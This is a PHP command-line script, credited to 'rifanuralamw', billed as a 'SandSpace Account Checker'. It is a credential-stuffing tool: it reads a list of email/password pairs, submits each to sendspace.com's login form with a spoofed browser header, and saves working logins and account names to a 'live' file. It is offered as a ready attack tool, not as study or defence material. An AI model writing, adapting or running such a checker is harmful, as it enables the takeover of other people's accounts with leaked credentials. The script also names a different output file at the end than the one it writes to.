<?php  
require("class_curl.php");
date_default_timezone_set('Asia/Jakarta');
error_reporting(1);
ob_implicit_flush(true);
ini_set('display_errors', 0);
function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}


function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}



echo "============================================\n";
echo "           SandSpace Account Checker "; 
echo "\n============================================\n";
echo "Created by : \033[92mrifanuralamw\033[0m \033[0m\nCredit     : @2020\n";
echo "============================================\n";
echo "Delim \t\t: ";
$delim = trim(fgets(STDIN));
$time_start = microtime_float();
echo "List \t\t: ";
$list = trim(fgets(STDIN));

echo "Sleep \t\t: ";
$tidur = trim(fgets(STDIN));
echo "============================================\n";
$file = file_get_contents("$list");
$data = explode("\n",$file);
$baris = count($data);
$jumlah= 0; $live=0; $mati=0; $timeout=0;

for($a=0;$a<count($data);$a++){
	$jumlah+=1;
	$date = date("h:i:sa");
        $data1 = explode($delim,$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];

        $x = new curlx();
		$val = "action=login&username=".$email."&password=".$pass."&remember=on&submit=Log+In";
		$regis = $x->curl("https://www.sendspace.com/login.html", array(
	'header' => array(
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language: en-US,en;q=0.5",
		"Content-Type: application/x-www-form-urlencoded",
		"Connection: keep-alive",
		"Upgrade-Insecure-Requests: 1"),
	'post' => $val,
));


if (strpos($regis["data"],"check your username/email and password")) {
	echo "DIE | $email | $pass \n"; 
	$mati+=1;
}elseif (strpos($regis["data"],"Logout?")) {
	$nama = getStr($regis["data"],"<span>Hi,","</span>");
	echo "LIVE | $email | $pass | nama: $nama \n"; 
	$live+=1;
	save($email."|".$pass."|".$nama, "sendspaceLIVE.txt");
}else{
	echo "TIMEOUT | $email | $pass \n"; 
	$timeout+=1;
}
	 	ob_flush();
		sleep($tidur);

	}
echo "============================================\n";	
echo "Account \033[92mLive:$live \033[0m, account \033[91mDie:$mati\033[0m,account \033[91mTimeout:$timeout\033[0m";
echo "\nSaved at \033[92mresultsendspace.txt\033[0m\n";	
?>